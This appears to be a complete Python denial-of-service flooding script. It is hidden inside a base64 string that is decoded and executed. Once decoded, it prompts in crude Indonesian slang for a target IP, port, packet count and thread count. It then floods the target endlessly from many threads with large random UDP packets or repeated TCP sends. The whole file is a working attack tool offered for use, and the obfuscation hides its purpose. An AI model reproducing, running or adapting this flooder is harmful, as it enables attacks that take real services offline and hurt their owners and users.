import base64
exec(base64.b64decode('aW1wb3J0IHJhbmRvbQppbXBvcnQgc29ja2V0CmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IG9zCgpvcy5zeXN0ZW0oImNsZWFyIikKcHJpbnQoIlwwMzNbOTVtIikKcHJpbnQoIiIiCuKWiOKWiOKVl+KWkeKWkeKWiOKWiOKVl+KWkeKWiOKWiOKWiOKWiOKWiOKVl+KWkQrilojilojilZHilpHilpHilojilojilZHilojilojilZTilZDilZDilojilojilZcK4paI4paI4paI4paI4paI4paI4paI4pWR4paI4paI4pWR4paR4paR4pWa4pWQ4pWdCuKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVkeKWiOKWiOKVkeKWkeKWkeKWiOKWiOKVlwrilojilojilZHilpHilpHilojilojilZHilZrilojilojilojilojilojilZTilZ0K4pWa4pWQ4pWd4paR4paR4pWa4pWQ4pWd4paR4pWa4pWQ4pWQ4pWQ4pWQ4pWd4paRCuKWiOKWiOKVl+KWkeKWkeKWkeKWkeKWkeKWiOKWiOKVl+KWkeKWkeKWkeKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVlwrilojilojilZHilpHilpHilpHilpHilpHilojilojilZHilpHilpHilpHilojilojilZHilZrilZDilZDilojilojilZTilZDilZDilZ3ilZrilZDilZDilojilojilZTilZDilZDilZ0K4paI4paI4pWR4paR4paR4paR4paR4paR4paI4paI4pWR4paR4paR4paR4paI4paI4pWR4paR4paR4paR4paI4paI4pWR4paR4paR4paR4paR4paR4paR4paI4paI4pWR4paR4paR4paRCuKWiOKWiOKVkeKWkeKWkeKWkeKWkeKWkeKWiOKWiOKVkeKWkeKWkeKWkeKWiOKWiOKVkeKWkeKWkeKWkeKWiOKWiOKVkeKWkeKWkeKWkeKWkeKWkeKWkeKWiOKWiOKVkeKWkeKWkeKWkQrilojilojilojilojilojilojilojilZfilZrilojilojilojilojilojilojilZTilZ3ilpHilpHilpHilojilojilZHilpHilpHilpHilpHilpHilpHilojilojilZHilpHilpHilpEK4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4paR4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4paR4paR4paR4paR4pWa4pWQ4pWd4paR4paR4paR4paR4paR4paR4pWa4pWQ4pWd4paR4paR4paRCiIiIikKCmlwID0gc3RyKGlucHV0KCJcMDMzWzkxbUlQIE5ZQSBBU1UgUEVQRUsgPj46IikpCnBvcnQgPSBpbnQoaW5wdXQoIlwwMzNbOTFtUE9SVCBOWUEgIFBFUEVLID4+OiIpKQpjaG9pY2UgPSBzdHIoaW5wdXQoIlwwMzNbOTFtR0FTUyBHQUs/PyhDYXJpIHNlbmRpcmkpID4+OiIpKQp0aW1lcyA9IGludChpbnB1dCgiXDAzM1s5MW1QQUtFVCBOWUEgUEVQRUsgQVNVPyA+PjoiKSkKdGhyZWFkcyA9IGludChpbnB1dCgiXDAzM1s5MW1UaHJlYWRzIE1PIEJSUCBBU1U/ID4+OiIpKQpkZWYgcnVuKCk6CglkYXRhID0gcmFuZG9tLl91cmFuZG9tKDIwMDAwKQoJaSA9IHJhbmRvbS5jaG9pY2UoKCJcMDMzWzk1bUFISEggS09LIE5FTUJVU1MiLCIiLCIiKSkKCXdoaWxlIFRydWU6CgkJdHJ5OgoJCQlzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pCgkJCWFkZHIgPSAoc3RyKGlwKSxpbnQocG9ydCkpCgkJCWZvciB4IGluIHJhbmdlKHRpbWVzKToKCQkJCXMuc2VuZHRvKGRhdGEsYWRkcikKCQkJcHJpbnQoaSArIiBDUk9PVC4uLkNST1RUVCBNQU1QVVMiKQoJCWV4Y2VwdDoKCQkJcHJpbnQoIlwwMzNbOTFtWyFdIEVycm9yIFBlcGVrISEhIikKCmRlZiBydW4yKCk6CglkYXRhID0gcmFuZG9tLl91cmFuZG9tKDE3MCkKCWkgPSByYW5kb20uY2hvaWNlKCgiXDAzM1s5NW1BSEhISEhIIEtPS0tLIE5FTUJVU1NTIiwiIiwiIikpCgl3aGlsZSBUcnVlOgoJCXRyeToKCQkJcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKCQkJcy5jb25uZWN0KChpcCxwb3J0KSkKCQkJcy5zZW5kKGRhdGEpCgkJCWZvciB4IGluIHJhbmdlKHRpbWVzKToKCQkJCXMuc2VuZChkYXRhKQoJCQlwcmludChpICsiIENST1RULi4uQ1JPVFRUVCBNQU1QVVMiKQoJCWV4Y2VwdDoKCQkJcy5jbG9zZSgpCgkJCXByaW50KCJcMDMzWzkxbVsqXSBFcnJvciBQRVBFSyIpCiAgICAgICAgICAgIApmb3IgeSBpbiByYW5nZSh0aHJlYWRzKToKCWlmIGNob2ljZSA9PSAnQ1JPVCc6CgkJdGggPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldCA9IHJ1bikKCQl0aC5zdGFydCgpCgllbHNlOgoJCXRoID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQgPSBydW4yKQoJCXRoLnN0YXJ0KCkK'))